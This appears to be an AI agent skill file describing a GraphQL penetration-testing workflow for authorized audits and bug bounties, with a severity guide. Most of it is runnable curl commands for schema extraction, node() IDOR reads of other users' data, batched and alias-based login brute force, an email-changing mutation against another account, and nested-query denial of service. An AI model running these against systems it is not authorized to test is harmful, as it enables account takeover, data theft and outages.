---
name: web-vuln-graphql
description: GraphQL API security testing including introspection, batching, and authorization bypass
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Tests GraphQL APIs for security misconfigurations including introspection exposure, field-level authorization bypass, node() interface IDOR, query batching and alias-based rate limit bypass, mutation authorization gaps, nested query DoS, and directive overloading. Maps the full schema when introspection is enabled and systematically tests each finding for exploitable impact.

## When to use

- When the target application exposes a `/graphql` or `/api/graphql` endpoint
- When auditing APIs for authorization bypasses (IDOR via GraphQL node IDs)
- When testing rate limit enforcement on sensitive operations (login, OTP, password reset)
- During bug bounty or penetration testing of modern web applications

## Prerequisites

- `curl` installed
- GraphQL endpoint URL and a valid authentication token (user-level; admin token for comparison if available)

## Inputs

| Variable | Description | Example |
|----------|-------------|---------|
| `GQL_URL` | GraphQL endpoint URL | `https://api.example.com/graphql` |
| `AUTH_TOKEN` | Bearer token for authenticated requests | `eyJhbGci...` |
| `VICTIM_USER_ID` | A second user's base64 node ID for IDOR testing | `dXNlcjoy` |

## Workflow

### Step 1: Test introspection enabled

```bash
GQL_URL="https://api.example.com/graphql"
AUTH_TOKEN="YOUR_BEARER_TOKEN"

echo "=== Step 1: Introspection test ==="

# Unauthenticated introspection
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | python3 -m json.tool

echo ""

# Authenticated introspection
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | python3 -m json.tool
```

### Step 2: Extract full schema via introspection

```bash
echo ""
echo "=== Step 2: Full schema extraction ==="

curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{
    "query": "{ __schema { types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"
  }' > /tmp/gql_schema.json

python3 -m json.tool /tmp/gql_schema.json > /tmp/gql_schema_pretty.json

echo "Schema saved to /tmp/gql_schema_pretty.json"
echo ""
echo "=== Types found ==="
python3 -c "
import json
with open('/tmp/gql_schema.json') as f:
    data = json.load(f)
types = data.get('data', {}).get('__schema', {}).get('types', [])
for t in types:
    if not t['name'].startswith('__'):
        print(f\"  {t['kind']:12} {t['name']}\")
" 2>/dev/null

echo ""
echo "=== Potentially sensitive fields (look for: ssn, dob, password, token, secret, admin, role) ==="
python3 -c "
import json
with open('/tmp/gql_schema.json') as f:
    data = json.load(f)
types = data.get('data', {}).get('__schema', {}).get('types', [])
sensitive = ['ssn','dob','password','token','secret','admin','role','credit','salary','phone','address']
for t in types:
    for field in (t.get('fields') or []):
        name_lower = field['name'].lower()
        if any(s in name_lower for s in sensitive):
            print(f\"  {t['name']}.{field['name']}\")
" 2>/dev/null
```

### Step 3: Test field suggestion exploitation

```bash
echo ""
echo "=== Step 3: Field suggestion (disabled introspection workaround) ==="

# When introspection is disabled, servers often still return suggestions
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"query":"{ usr { emai } }"}' | python3 -m json.tool
# Look for: "Did you mean \"email\"?" in the error — reveals field names without introspection
```

### Step 4: Test node() interface IDOR

```bash
echo ""
echo "=== Step 4: node() interface IDOR ==="

VICTIM_USER_ID="dXNlcjoy"  # base64("User:2") — change to a real victim node ID

# Try fetching another user's data via the global node() interface
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d "{
    \"query\": \"{ node(id: \\\"$VICTIM_USER_ID\\\") { id ... on User { email phoneNumber createdAt } } }\"
  }" | python3 -m json.tool

# Also test with inline fragments for other types
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"query":"{ node(id: \"T3JkZXI6Mw==\") { id ... on Order { total items { name } } } }"}' | python3 -m json.tool
```

### Step 5: Test query batching for rate limit bypass

```bash
echo ""
echo "=== Step 5: Query batching (rate limit bypass) ==="

# Send 5 login attempts in a single HTTP request via array batching
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ login(email: \"victim@example.com\", password: \"pass1\") { token } }"},
    {"query": "{ login(email: \"victim@example.com\", password: \"pass2\") { token } }"},
    {"query": "{ login(email: \"victim@example.com\", password: \"pass3\") { token } }"},
    {"query": "{ login(email: \"victim@example.com\", password: \"pass4\") { token } }"},
    {"query": "{ login(email: \"victim@example.com\", password: \"pass5\") { token } }"}
  ]' | python3 -m json.tool

echo ""
echo "[NOTE] If server returns an array of 5 results rather than a 429, batching is not rate-limited"
```

### Step 6: Test alias-based brute force

```bash
echo ""
echo "=== Step 6: Alias-based brute force (rate limit bypass) ==="

# Aliases allow multiple calls to the same field in a single query
# This bypasses per-request rate limits that only count one operation
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ a1: login(email: \"victim@example.com\", password: \"pass1\") { token } a2: login(email: \"victim@example.com\", password: \"pass2\") { token } a3: login(email: \"victim@example.com\", password: \"pass3\") { token } }"
  }' | python3 -m json.tool

echo ""
echo "[NOTE] If multiple alias results return without rate limiting, alias brute force is possible"
```

### Step 7: Test mutation authorization bypass

```bash
echo ""
echo "=== Step 7: Mutation authorization ==="

echo "[MANUAL] For each mutation in the schema, test:"
echo "  1. Can a regular user call admin-only mutations (deleteUser, updateRole, createCoupon)?"
echo "  2. Can a user mutate another user's resources by supplying their ID?"
echo "  3. Does the mutation respect object-level authorization (not just field-level)?"
echo ""

# Example: attempt to update another user's profile
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{
    "query": "mutation { updateUser(id: \"VXNlcjoy\", input: { email: \"hacked@attacker.com\" }) { id email } }"
  }' | python3 -m json.tool
```

### Step 8: Test depth and complexity limits (nested query DoS)

```bash
echo ""
echo "=== Step 8: Nested query depth (DoS) ==="

# Send a deeply nested query — a server without depth limits will resolve all levels
curl -s -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{
    "query": "{ users { friends { friends { friends { friends { friends { id email } } } } } } }"
  }' | python3 -m json.tool

echo ""
echo "[NOTE] If this query executes without error, depth limiting is not enforced"
echo "       A sufficiently deep query can cause exponential DB lookups"
```

### Step 9: Document findings

```bash
echo ""
echo "=== Finding severity guide ==="
cat <<'EOF'
Finding                          Severity  Notes
-------------------------------- --------- ----------------------------------
Introspection enabled            Info      Alone = Info; enables deeper attacks
Field suggestion leaks schema    Info      Same as above
node() IDOR — read PII           High      Direct user data exposure
node() IDOR — admin fields       Critical  Privilege escalation
Batching — rate limit bypass     Medium    Depends on what endpoint is bypassed
Alias brute force — auth bypass  High      If login/OTP endpoint is affected
Mutation auth bypass (own data)  High      IDOR via mutation
Mutation auth bypass (any user)  Critical  Privilege escalation
Nested query DoS (unbounded)     Medium    Availability impact, no auth needed
Directive overloading crash      Medium    Potential DoS via malformed query
EOF
```

## Done when

- Introspection tested both authenticated and unauthenticated
- Full schema extracted (or field suggestions confirmed when introspection disabled)
- node() IDOR tested with a second user's node ID
- Query batching tested on at least one rate-limited endpoint
- Alias-based brute force tested on login or OTP endpoint
- Mutation authorization tested for at least one mutation
- Depth limit tested with a 5-level nested query

## Failure modes

| Symptom | Cause and resolution |
|---------|----------------------|
| Introspection returns empty or null | Introspection disabled. Proceed with field suggestion (Step 3) and manual schema discovery |
| Batch query returns 400 "not an object" | Server does not support array batching. Test alias-based batching instead (Step 6) |
| node() returns null for victim ID | Object-level auth is enforced for node() — document as mitigated. Test individual queries for the type instead |
| Deeply nested query returns immediate error | Depth limit is enforced. Document as mitigated |
| All mutations return "unauthorized" | Field-level auth is enforced. Try type-level bypasses: access fields via inline fragments on interfaces |

## Notes

- InQL (Burp Suite extension) automates schema extraction and generates query stubs for every type — useful for large schemas.
- GraphQL IDOR via node() is distinct from REST IDOR: node IDs are base64-encoded type+ID strings (e.g. `User:2`). Decode with `echo "dXNlcjoy" | base64 -d` to understand the ID space.
- Some servers disable introspection in production but leave it enabled for authenticated users. Always test both states.
- Directive overloading: sending `@skip(if: false) @skip(if: false) ...` repeated thousands of times can crash some parsers.
- Reference: OWASP API Security Top 10 — API8 (Security Misconfiguration), HackerOne public disclosures tagged `graphql`.
